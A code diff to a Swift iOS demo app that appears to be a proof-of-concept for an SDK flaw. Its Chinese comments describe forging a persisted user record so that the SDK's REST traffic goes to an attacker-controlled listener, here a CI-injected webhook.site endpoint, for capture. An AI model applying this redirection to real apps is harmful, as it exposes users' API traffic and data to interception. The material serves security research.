@@ -83,7 +83,9 @@ final class AppDelegate: UIResponder, UIApplicationDelegate {
     }
 
     private func startKit(vc: DemoVC) {
-        let attackerBase = "http://127.0.0.1:18080"
+        // 攻击者端点 = webhook.site (CI 注入到 Info.plist; 公网可达, 绕开模拟器 loopback 与 ATS 变量)
+        func plist(_ key: String) -> String { (Bundle.main.infoDictionary?[key] as? String) ?? "UNSET" }
+        let attackerBase = plist("ZDK_SETTINGS_BASE_URL")
 
         // ① 构造伪造 User (realtimeSettings.baseURL → 攻击者) — f248 覆写后的持久化状态等价物
         vc.log("① 构造伪造 User (realtimeSettings.baseURL → \(attackerBase))")
@@ -108,7 +110,7 @@ final class AppDelegate: UIResponder, UIApplicationDelegate {
         }
 
         // ④ 初始化 SDK — 观察 persistedUserRetrieved 是否命中伪造 User
-        func plist(_ key: String) -> String { (Bundle.main.infoDictionary?[key] as? String) ?? "REPLACE_ME" }
+        // (plist helper 已在上方定义)
         let config = Config(
             appId: plist("ZDK_APP_ID"),
             baseURL: attackerBase,        // REST 全部走攻击者监听器 (mock + 捕获)
